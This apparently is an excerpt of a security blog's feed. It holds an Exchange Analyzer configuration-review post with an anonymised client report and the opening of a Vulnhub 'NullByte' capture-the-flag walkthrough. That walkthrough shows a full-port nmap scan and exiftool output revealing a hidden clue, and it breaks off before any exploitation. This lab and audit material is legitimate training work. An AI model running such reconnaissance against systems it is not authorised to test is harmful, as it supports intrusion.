&lt;span class="code-line"&gt;&lt;span class="n"&gt;feel&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;free&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;catch&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;me&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;on&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;freenode&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;in&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;#vulnhub&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;or&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;on&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;twitter&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;@leonjza&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="conclusion"&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;This was a really great challange! The android part was a really new to me. The
exploitation part was very interesting!.&lt;/p&gt;
&lt;p&gt;Many thanks to TurboSmouem for the challange and as usual thanks to vulnhub.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="vulnhub"></category><category term="challenge"></category><category term="boot2root"></category><category term="linux"></category></entry><entry><title>Auditing Exchange Server</title><link href="https://maggick.fr/2016/02/auditing-exchange-server.html" rel="alternate"></link><published>2016-02-29T21:49:00+01:00</published><updated>2016-02-29T21:49:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2016-02-29:/2016/02/auditing-exchange-server.html</id><summary type="html">&lt;p&gt;&lt;img alt="ExchangeAnalyser" class="align-left" src="/media/2016.02/exchange.png" width="252"/&gt;&lt;/p&gt;
&lt;p&gt;Recently I performed a MS Exchange configuration review. For the "old" version
of exchange we can use the
&lt;a href="https://www.microsoft.com/en-us/download/details.aspx?id=22485"&gt;Microsoft Exchange Best Practices
Analyzer&lt;/a&gt;.
For the new version of MS Exchange (2013 and 2016) the tools must be download
from &lt;a href="https://community.office365.com/en-us/w/deploy/office-365-best-practices-analyzer-for-exchange-server-2013"&gt;the office 365
market&lt;/a&gt;.
But most of the MS Exchange server are not directly connected to internet. That
is why I used a tool developed by Paul Cunningham: &lt;a href="https://github.com/cunninghamp/ExchangeAnalyzer"&gt;Exchange Analyzer available
on github&lt;/a&gt;.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2016.02/exchange.png" alt="ExchangeAnalyser" width="252"&gt;&lt;/p&gt;
&lt;p&gt;Recently I performed a MS Exchange configuration review. For the "old" version
of exchange we can use the
&lt;a href="https://www.microsoft.com/en-us/download/details.aspx?id=22485"&gt;Microsoft Exchange Best Practices
Analyzer&lt;/a&gt;.
For the new version of MS Exchange (2013 and 2016) the tools must be download
from &lt;a href="https://community.office365.com/en-us/w/deploy/office-365-best-practices-analyzer-for-exchange-server-2013"&gt;the office 365
market&lt;/a&gt;.
But most of the MS Exchange server are not directly connected to internet. That
is why I used a tool developed by Paul Cunningham: &lt;a href="https://github.com/cunninghamp/ExchangeAnalyzer"&gt;Exchange Analyzer available
on github&lt;/a&gt;.&lt;/p&gt;


&lt;h2 id="getting-and-installing-the-script"&gt;Getting and installing the script&lt;/h2&gt;
&lt;p&gt;The documentation is clear, you just need to download the last zip archive on
the &lt;a href="http://exchangeserverpro.com/exchangeanalyzer/"&gt;"official website"&lt;/a&gt;,
extract the files, put files in the &lt;code&gt;Modules&lt;/code&gt; folder into
&lt;code&gt;C:\Windows\System32\WindowsPowerShell\V1.0\Modules&lt;/code&gt; and launch the script.&lt;/p&gt;
&lt;h2 id="tests"&gt;Tests&lt;/h2&gt;
&lt;p&gt;There is actually seven tests implemented:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;EXSRV001: checks that all MS Exchange servers in the organization use MS
   Exchange 2013 or 2016.&lt;/li&gt;
&lt;li&gt;EXSRV002: checks the build version of each server to determine whether it is
   running the last build for the MS Exchange version (&lt;em&gt;Internet connection is
   required&lt;/em&gt;).&lt;/li&gt;
&lt;li&gt;CAS001: tests each Exchange site to determine whether more than one CAS URL/namespace
   exists for each HTTPS service.&lt;/li&gt;
&lt;li&gt;CAS002: tests each CAS URL to determine whether it contains a server FQDN.&lt;/li&gt;
&lt;li&gt;DB001: tests each mailbox database to determine whether the database has been
   backed up in the last 24 hours.&lt;/li&gt;
&lt;li&gt;AD001: verifies that the Active Directory Domain level is at the correct
   level.&lt;/li&gt;
&lt;li&gt;AD002: verifies that the Active Directory Forest level is Windows 2008 or
   greater.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;More tests will come in a quite near future as both
&lt;a href="https://github.com/cunninghamp/ExchangeAnalyzer/pulls"&gt;pull requests&lt;/a&gt; and
&lt;a href="https://github.com/cunninghamp/ExchangeAnalyzer/issues"&gt;issues&lt;/a&gt; are currently
open on github.&lt;/p&gt;
&lt;h2 id="results"&gt;Results&lt;/h2&gt;
&lt;p&gt;The result is simple, it is a HTML file with the different tests and a past or
fail attribute. The script need an internet connection to check the latest build
number. As there where no direct access to the internet from the MS Exchange
servers of my client, the test failed with a Warning and output the error
message: "Unable to connect to remote server".
Moreover my client did not wish to backup its databases so the test DB001
failed.&lt;/p&gt;
&lt;p&gt;Below is a sample of this output, I have just anonymize it and reduce the
number of server.&lt;/p&gt;
&lt;h2 id="output"&gt;Output&lt;/h2&gt;
&lt;p&gt;&lt;html&gt;
      &lt;style&gt;
      BODY{font-family: Arial; font-size: 10pt;}
      H1{font-size: 22px;}
      H2{font-size: 20px; padding-top: 10px;}
      H3{font-size: 16px; padding-top: 8px;}
      TABLE{border: 1px solid black; border-collapse: collapse; font-size: 8pt;}
      TH{border: 1px solid black; background: #dddddd; padding: 5px; color: #000000;}
      TD{border: 1px solid black; padding: 5px; }
      td.pass{background: #7FFF00;}
      td.warn{background: #FFE600;}
      td.fail{background: #FF0000; color: #ffffff;}
      td.info{background: #85D4FF;}
            ul{list-style: inside; padding-left: 0px;}
      &lt;/style&gt;
      &lt;body&gt;&lt;h1 align="center"&gt;Exchange Analyzer Report&lt;/h1&gt;
      &lt;h3 align="center"&gt;Generated: 02/18/2016 11:38:42&lt;/h3&gt;
            &lt;h3 align="center"&gt;Organization: CLIENT&lt;/h3&gt;
            &lt;p&gt;The following guidelines apply to this report:
            &lt;ul&gt;
                &lt;li&gt;This tests included in this report are documented on the &lt;a href="https://github.com/cunninghamp/ExchangeAnalyzer/wiki/Exchange-Analyzer-Tests"&gt;Exchange Analyzer Wiki&lt;/a&gt;.&lt;/li&gt;
                &lt;li&gt;Click the "More Info" link for each test to learn more about that test, what a pass or fail means, and recommendations for how to respond.&lt;/li&gt;
                &lt;li&gt;A test can fail if it can't complete successfully, or if a condition was encountered that requires manual assessment.&lt;/li&gt;
                &lt;li&gt;For some organizations a failed test may be due to a deliberate design or operational decision.&lt;/li&gt;
                &lt;li&gt;Please review the &lt;a href="https://github.com/cunninghamp/ExchangeAnalyzer/wiki/Frequently-Asked-Questions"&gt;Frequently Asked Questions&lt;/a&gt; if you have any further questions.&lt;/li&gt;
            &lt;/ul&gt;
            &lt;/p&gt;&lt;h2 align="center"&gt;Summary:&lt;/h2&gt;
                      &lt;p align="center"&gt;
                      &lt;table&gt;
                      &lt;tr&gt;
                      &lt;th&gt;Passed&lt;/th&gt;
                      &lt;th&gt;Warning&lt;/th&gt;
                      &lt;th&gt;Failed&lt;/th&gt;
                      &lt;th&gt;Info&lt;/th&gt;
                      &lt;/tr&gt;
                      &lt;tr&gt;
                      &lt;td class="pass"&gt;4&lt;/td&gt;
                      &lt;td class="warn"&gt;1&lt;/td&gt;
                      &lt;td class="fail"&gt;2&lt;/td&gt;
                      &lt;td class="info"&gt;0&lt;/td&gt;
                      &lt;/tr&gt;
                      &lt;/table&gt;
                      &lt;/p&gt;&lt;h2&gt;Category: Exchange Servers&lt;/h2&gt;&lt;p&gt;
                  &lt;table&gt;
                  &lt;tr&gt;
                  &lt;th&gt;Test ID&lt;/th&gt;
                  &lt;th&gt;Test Category&lt;/th&gt;
                  &lt;th&gt;Test Name&lt;/th&gt;
                  &lt;th&gt;Test Outcome&lt;/th&gt;
                  &lt;th&gt;Passed Objects&lt;/th&gt;
                  &lt;th&gt;Failed Objects&lt;/th&gt;
                  &lt;th&gt;Comments&lt;/th&gt;
                  &lt;th&gt;Reference&lt;/th&gt;
                  &lt;/tr&gt;&lt;tr&gt;&lt;td&gt;EXSRV001&lt;/td&gt;&lt;td&gt;Exchange Servers&lt;/td&gt;&lt;td&gt;Exchange Versions&lt;/td&gt;&lt;td class="pass"&gt;Passed&lt;/td&gt;&lt;td&gt;&lt;ul&gt;&lt;li&gt;WindowsServer1&lt;/li&gt;&lt;li&gt;WindowsServer2&lt;/li&gt;&lt;li&gt;WindowsServer3&lt;/ul&gt;&lt;/td&gt;&lt;td&gt;n/a&lt;/td&gt;&lt;td&gt;All Exchange servers in the organization are Exchange 2013/2016.&lt;/td&gt;&lt;td&gt;&lt;a href="https://github.com/cunninghamp/ExchangeAnalyzer/wiki/EXSRV001" target="_blank"&gt;More Info&lt;/a&gt;&lt;/td&gt;&lt;tr&gt;&lt;td&gt;EXSRV002&lt;/td&gt;&lt;td&gt;Exchange Servers&lt;/td&gt;&lt;td&gt;Build Numbers&lt;/td&gt;&lt;td class="warn"&gt;Warning&lt;/td&gt;&lt;td&gt;n/a&lt;/td&gt;&lt;td&gt;n/a&lt;/td&gt;&lt;td&gt;Errors were encountered. An error occurred. Unable to connect to remote server&lt;/td&gt;&lt;td&gt;&lt;a href="https://github.com/cunninghamp/ExchangeAnalyzer/wiki/EXSRV002" target="_blank"&gt;More Info&lt;/a&gt;&lt;/td&gt;&lt;/table&gt;&lt;/p&gt;&lt;h2&gt;Category: Client Access&lt;/h2&gt;&lt;p&gt;Summary of Client Access URLs/Namespaces:&lt;/p&gt;&lt;table&gt;
                            &lt;tr&gt;
                            &lt;th colspan="3"&gt;Server: WindowsServer1, Site: &lt;/th&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;th&gt;Service&lt;/th&gt;
                            &lt;th&gt;Internal URL&lt;/th&gt;
                            &lt;th&gt;External Url&lt;/th&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Outlook Anywhere&lt;/td&gt;
                            &lt;td&gt;outlook-csh-ge.client.com&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;MAPI/HTTP&lt;/td&gt;
                            &lt;td&gt;https://windowsserver1.client.local/mapi&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Outlook on the web (OWA)&lt;/td&gt;
                            &lt;td&gt;https://mail.client.com/OWA https://mail.client.com/OWA&lt;/td&gt;
                            &lt;td&gt; &lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Exchange Control Panel&lt;/td&gt;
                            &lt;td&gt;https://mail.client.com/ecp https://mail.client.com/ecp&lt;/td&gt;
                            &lt;td&gt; &lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;ActiveSync&lt;/td&gt;
                            &lt;td&gt;https://eas.client.com/Microsoft-Server-ActiveSync&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Offline Address Book&lt;/td&gt;
                            &lt;td&gt;https://oab-csh-ge.client.com/OAB&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Exchange Web Access&lt;/td&gt;
                            &lt;td&gt;https://ews-csh-ge.client.com/EWS/Exchange.asmx&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;AutoDiscover&lt;/td&gt;
                            &lt;td&gt;https://autodiscover-csh-ge.client.com/autodiscover/autodiscover.xml&lt;/td&gt;
                            &lt;td&gt;n/a&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;/table&gt;
                            &lt;/p&gt;&lt;table&gt;
                            &lt;tr&gt;
                            &lt;th colspan="3"&gt;Server: WindowsServer2, Site: &lt;/th&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;th&gt;Service&lt;/th&gt;
                            &lt;th&gt;Internal URL&lt;/th&gt;
                            &lt;th&gt;External Url&lt;/th&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Outlook Anywhere&lt;/td&gt;
                            &lt;td&gt;outlook-csh-ge.client.com&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;MAPI/HTTP&lt;/td&gt;
                            &lt;td&gt;https://windowsserver2.client.local/mapi&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Outlook on the web (OWA)&lt;/td&gt;
                            &lt;td&gt;https://mail.client.com/OWA https://mail.client.com/OWA&lt;/td&gt;
                            &lt;td&gt; &lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Exchange Control Panel&lt;/td&gt;
                            &lt;td&gt;https://mail.client.com/ecp https://mail.client.com/ecp&lt;/td&gt;
                            &lt;td&gt; &lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;ActiveSync&lt;/td&gt;
                            &lt;td&gt;https://eas.client.com/Microsoft-Server-ActiveSync&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Offline Address Book&lt;/td&gt;
                            &lt;td&gt;https://oab-csh-ge.client.com/OAB&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Exchange Web Access&lt;/td&gt;
                            &lt;td&gt;https://ews-csh-ge.client.com/EWS/Exchange.asmx&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;AutoDiscover&lt;/td&gt;
                            &lt;td&gt;https://autodiscover-csh-ge.client.com/autodiscover/autodiscover.xml&lt;/td&gt;
                            &lt;td&gt;n/a&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;/table&gt;
                            &lt;/p&gt;&lt;table&gt;
                            &lt;tr&gt;
                            &lt;th colspan="3"&gt;Server: WindowsServer3, Site: &lt;/th&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;th&gt;Service&lt;/th&gt;
                            &lt;th&gt;Internal URL&lt;/th&gt;
                            &lt;th&gt;External Url&lt;/th&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Outlook Anywhere&lt;/td&gt;
                            &lt;td&gt;outlook-csh-ge.client.com&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;MAPI/HTTP&lt;/td&gt;
                            &lt;td&gt;https://windowsserver3.client.local/mapi&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Outlook on the web (OWA)&lt;/td&gt;
                            &lt;td&gt;https://mail.client.com/OWA https://mail.client.com/OWA&lt;/td&gt;
                            &lt;td&gt; &lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Exchange Control Panel&lt;/td&gt;
                            &lt;td&gt;https://mail.client.com/ecp https://mail.client.com/ecp&lt;/td&gt;
                            &lt;td&gt; &lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;ActiveSync&lt;/td&gt;
                            &lt;td&gt;https://eas.client.com/Microsoft-Server-ActiveSync&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Offline Address Book&lt;/td&gt;
                            &lt;td&gt;https://oab-csh-ge.client.com/OAB&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Exchange Web Access&lt;/td&gt;
                            &lt;td&gt;https://ews-csh-ge.client.com/EWS/Exchange.asmx&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;AutoDiscover&lt;/td&gt;
                            &lt;td&gt;https://autodiscover-csh-ge.client.com/autodiscover/autodiscover.xml&lt;/td&gt;
                            &lt;td&gt;n/a&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;/table&gt;
                            &lt;/p&gt;&lt;p&gt;
                  &lt;table&gt;
                  &lt;tr&gt;
                  &lt;th&gt;Test ID&lt;/th&gt;
                  &lt;th&gt;Test Category&lt;/th&gt;
                  &lt;th&gt;Test Name&lt;/th&gt;
                  &lt;th&gt;Test Outcome&lt;/th&gt;
                  &lt;th&gt;Passed Objects&lt;/th&gt;
                  &lt;th&gt;Failed Objects&lt;/th&gt;
                  &lt;th&gt;Comments&lt;/th&gt;
                  &lt;th&gt;Reference&lt;/th&gt;
                  &lt;/tr&gt;&lt;tr&gt;&lt;td&gt;CAS001&lt;/td&gt;&lt;td&gt;Client Access&lt;/td&gt;&lt;td&gt;Client Access Namespaces&lt;/td&gt;&lt;td class="fail"&gt;Failed&lt;/td&gt;&lt;td&gt;n/a&lt;/td&gt;&lt;td&gt;&lt;ul&gt;&lt;li&gt;AAA-BB-PROJET&lt;/li&gt;&lt;li&gt;AAA-SUD-PROJET&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt;&lt;td&gt;One or more Exchange sites has more than one namespace per HTTPS protocol.&lt;/td&gt;&lt;td&gt;&lt;a href="https://github.com/cunninghamp/ExchangeAnalyzer/wiki/CAS001" target="_blank"&gt;More Info&lt;/a&gt;&lt;/td&gt;&lt;tr&gt;&lt;td&gt;CAS002&lt;/td&gt;&lt;td&gt;Client Access&lt;/td&gt;&lt;td&gt;Server FQDNs in URLs&lt;/td&gt;&lt;td class="pass"&gt;Passed&lt;/td&gt;&lt;td&gt;&lt;ul&gt;&lt;li&gt;WindowsServer1&lt;/li&gt;&lt;li&gt;WindowsServer2&lt;/li&gt;&lt;li&gt;WindowsServer3&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt;&lt;td&gt;n/a&lt;/td&gt;&lt;td&gt;No Exchange HTTPS services have URLs containing server FQDNs.&lt;/td&gt;&lt;td&gt;&lt;a href="https://github.com/cunninghamp/ExchangeAnalyzer/wiki/CAS002" target="_blank"&gt;More Info&lt;/a&gt;&lt;/td&gt;&lt;/table&gt;&lt;/p&gt;&lt;h2&gt;Category: Databases&lt;/h2&gt;&lt;p&gt;
                  &lt;table&gt;
                  &lt;tr&gt;
                  &lt;th&gt;Test ID&lt;/th&gt;
                  &lt;th&gt;Test Category&lt;/th&gt;
                  &lt;th&gt;Test Name&lt;/th&gt;
                  &lt;th&gt;Test Outcome&lt;/th&gt;
                  &lt;th&gt;Passed Objects&lt;/th&gt;
                  &lt;th&gt;Failed Objects&lt;/th&gt;
                  &lt;th&gt;Comments&lt;/th&gt;
                  &lt;th&gt;Reference&lt;/th&gt;
                  &lt;/tr&gt;&lt;tr&gt;&lt;td&gt;DB001&lt;/td&gt;&lt;td&gt;Databases&lt;/td&gt;&lt;td&gt;Database Backups&lt;/td&gt;&lt;td class="fail"&gt;Failed&lt;/td&gt;&lt;td&gt;n/a&lt;/td&gt;&lt;td&gt;&lt;ul&gt;&lt;li&gt;DAG2-DB01 (Never)&lt;/li&gt;&lt;li&gt;DAG2-DB13 (Never)&lt;/li&gt;&lt;li&gt;DAG1-DB36 (Never)&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt;&lt;td&gt;One or more Exchange databases has not been backed up within the last 24 hours.&lt;/td&gt;&lt;td&gt;&lt;a href="https://github.com/cunninghamp/ExchangeAnalyzer/wiki/DB001" target="_blank"&gt;More Info&lt;/a&gt;&lt;/td&gt;&lt;/table&gt;&lt;/p&gt;&lt;h2&gt;Category: Active Directory&lt;/h2&gt;&lt;p&gt;
                  &lt;table&gt;
                  &lt;tr&gt;
                  &lt;th&gt;Test ID&lt;/th&gt;
                  &lt;th&gt;Test Category&lt;/th&gt;
                  &lt;th&gt;Test Name&lt;/th&gt;
                  &lt;th&gt;Test Outcome&lt;/th&gt;
                  &lt;th&gt;Passed Objects&lt;/th&gt;
                  &lt;th&gt;Failed Objects&lt;/th&gt;
                  &lt;th&gt;Comments&lt;/th&gt;
                  &lt;th&gt;Reference&lt;/th&gt;
                  &lt;/tr&gt;&lt;tr&gt;&lt;td&gt;AD001&lt;/td&gt;&lt;td&gt;Active Directory&lt;/td&gt;&lt;td&gt;AD Domain Level&lt;/td&gt;&lt;td class="pass"&gt;Passed&lt;/td&gt;&lt;td&gt;&lt;ul&gt;&lt;li&gt;client.local (Windows Server 2008 R2)&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt;&lt;td&gt;n/a&lt;/td&gt;&lt;td&gt;All Active Directory domains meet the required functional level.&lt;/td&gt;&lt;td&gt;&lt;a href="https://github.com/cunninghamp/ExchangeAnalyzer/wiki/AD001" target="_blank"&gt;More Info&lt;/a&gt;&lt;/td&gt;&lt;tr&gt;&lt;td&gt;AD002&lt;/td&gt;&lt;td&gt;Active Directory&lt;/td&gt;&lt;td&gt;AD Forest Level&lt;/td&gt;&lt;td class="pass"&gt;Passed&lt;/td&gt;&lt;td&gt;&lt;ul&gt;&lt;li&gt;client.local (Windows Server 2008 R2)&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt;&lt;td&gt;n/a&lt;/td&gt;&lt;td&gt;The Active Directory forest meets the required functional level.&lt;/td&gt;&lt;td&gt;&lt;a href="https://github.com/cunninghamp/ExchangeAnalyzer/wiki/AD002" target="_blank"&gt;More Info&lt;/a&gt;&lt;/td&gt;&lt;/table&gt;&lt;/p&gt;&lt;p align="center"&gt;Report created by &lt;a href="http://exchangeanalyzer.com"&gt;Exchange Analyzer&lt;/a&gt;&lt;/p&gt;
        &lt;/body&gt;
&lt;/html&gt;&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="exchange"></category><category term="microsoft"></category></entry><entry><title>Vulnhub - NullByte</title><link href="https://maggick.fr/2015/09/vulnhub-nullbyte.html" rel="alternate"></link><published>2015-09-11T16:55:00+02:00</published><updated>2015-09-11T16:55:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2015-09-11:/2015/09/vulnhub-nullbyte.html</id><summary type="html">&lt;p&gt;&lt;img alt="NullByte" class="align-left" src="/media/2015.09/main.gif" width="162"/&gt;&lt;/p&gt;
&lt;p&gt;After the &lt;a href="https://maggick.fr/2015/09/acid.html"&gt;Acid&lt;/a&gt; challenge I was
really motivated. Therefore I give a look at another vulnhub machine I had already
download since a while:
&lt;a href="https://www.vulnhub.com/entry/nullbyte-1,126/"&gt;NullByte&lt;/a&gt;.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2015.09/main.gif" alt="NullByte" width="162"&gt;&lt;/p&gt;
&lt;p&gt;After the &lt;a href="https://maggick.fr/2015/09/acid.html"&gt;Acid&lt;/a&gt; challenge I was
really motivated. Therefore I give a look at another vulnhub machine I had already
download since a while:
&lt;a href="https://www.vulnhub.com/entry/nullbyte-1,126/"&gt;NullByte&lt;/a&gt;.&lt;/p&gt;


&lt;p&gt;The goal is to root the server.&lt;/p&gt;
&lt;h2 id="host-discovery"&gt;Host discovery&lt;/h2&gt;
&lt;p&gt;As always, we start with the host discovery with &lt;a href="http://nmap.org"&gt;nmap&lt;/a&gt;,
&lt;a href="https://cirt.net/Nikto2"&gt;nikto&lt;/a&gt; and
&lt;a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project"&gt;dirbuster&lt;/a&gt;:&lt;/p&gt;
&lt;h3 id="nmap"&gt;nmap&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nmap 192.168.0.20 -p0-65535 -A -oA nmap&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap 6.47 scan initiated Thu Sep 10 10:01:29 2015 as: nmap -p0-65535 -A -oA nmap 192.168.0.20&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 192.168.0.20&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.0089s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65532 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT      STATE SERVICE VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp    open  http    Apache httpd 2.4.10 ((Debian))&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-title: Null Byte 00 - level 1&lt;/span&gt;
&lt;span class="code-line"&gt;111/tcp   open  rpcbind 2-4 (RPC #100000)&lt;/span&gt;
&lt;span class="code-line"&gt;| rpcinfo:&lt;/span&gt;
&lt;span class="code-line"&gt;|   program version   port/proto  service&lt;/span&gt;
&lt;span class="code-line"&gt;|   100000  2,3,4        111/tcp  rpcbind&lt;/span&gt;
&lt;span class="code-line"&gt;|   100000  2,3,4        111/udp  rpcbind&lt;/span&gt;
&lt;span class="code-line"&gt;|   100024  1          34677/tcp  status&lt;/span&gt;
&lt;span class="code-line"&gt;|_  100024  1          37785/udp  status&lt;/span&gt;
&lt;span class="code-line"&gt;777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)&lt;/span&gt;
&lt;span class="code-line"&gt;34677/tcp open  status  1 (RPC #100024)&lt;/span&gt;
&lt;span class="code-line"&gt;MAC Address: A0:88:B4:C7:17:2C (Intel Corporate)&lt;/span&gt;
&lt;span class="code-line"&gt;Device type: general purpose&lt;/span&gt;
&lt;span class="code-line"&gt;Running: Linux 3.X&lt;/span&gt;
&lt;span class="code-line"&gt;OS CPE: cpe:/o:linux:linux_kernel:3&lt;/span&gt;
&lt;span class="code-line"&gt;OS details: Linux 3.11 - 3.14&lt;/span&gt;
&lt;span class="code-line"&gt;Network Distance: 1 hop&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;There is an HTTP server on the port 80 and an ssh service on port 777.&lt;/p&gt;
&lt;h2 id="exploitation"&gt;Exploitation&lt;/h2&gt;
&lt;p&gt;The web server display a picture with a simple message. Neither nikto nor
dirbuster give us some lead.  Let us run &lt;code&gt;exiftool&lt;/code&gt; on the picture:&lt;/p&gt;
&lt;h3 id="maingif"&gt;main.gif&lt;/h3&gt;
&lt;p&gt;&lt;img alt="main.gif" src="/media/2015.09/main.gif"&gt;&lt;/p&gt;
&lt;p&gt;The comment filed is interesting:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ExifTool Version Number         : 8.60&lt;/span&gt;
&lt;span class="code-line"&gt;File Name                       : main.gif&lt;/span&gt;
&lt;span class="code-line"&gt;Directory                       : .&lt;/span&gt;
&lt;span class="code-line"&gt;File Size                       : 16 kB&lt;/span&gt;
&lt;span class="code-line"&gt;File Modification Date/Time     : 2015:09:10 10:07:39+02:00&lt;/span&gt;
&lt;span class="code-line"&gt;File Permissions                : rw-r--r--&lt;/span&gt;
&lt;span class="code-line"&gt;File Type                       : GIF&lt;/span&gt;
&lt;span class="code-line"&gt;MIME Type                       : image/gif&lt;/span&gt;
&lt;span class="code-line"&gt;GIF Version                     : 89a&lt;/span&gt;
&lt;span class="code-line"&gt;Image Width                     : 235&lt;/span&gt;
&lt;span class="code-line"&gt;Image Height                    : 302&lt;/span&gt;
&lt;span class="code-line"&gt;Has Color Map                   : No&lt;/span&gt;
&lt;span class="code-line"&gt;Color Resolution Depth          : 8&lt;/span&gt;
&lt;span class="code-line"&gt;Bits Per Pixel                  : 1&lt;/span&gt;
&lt;span class="code-line"&gt;Background Color                : 0&lt;/span&gt;
&lt;span class="code-line"&gt;Comment                         : P-): kzMb5nVYJw&lt;/span&gt;
&lt;span class="code-line"&gt;Image Size                      : 235x302&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;What can we do with that?&lt;/p&gt;
&lt;h3 id="kzmb5nvyjw"&gt;kzMb5nVYJw&lt;/h3&gt;
